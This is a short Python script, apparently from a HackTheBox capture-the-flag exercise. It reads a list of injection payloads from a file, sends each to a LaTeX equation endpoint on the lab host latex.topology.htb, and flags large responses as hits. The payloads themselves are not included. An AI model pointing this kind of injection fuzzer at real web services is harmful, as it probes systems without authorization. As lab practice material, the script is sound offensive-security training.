import requests
payloads = []

with open("modified-payloads.txt", "r") as file:
    payloads = file.read().splitlines()

url = "http://latex.topology.htb/equation.php"


for payload in payloads:
    url = f"http://latex.topology.htb/equation.php?eqn={payload}&submit="
    responses = requests.get(url)
    #print(len(responses.text))

    if len(responses.content) > 10000:
        print(f"Hit {payload}")
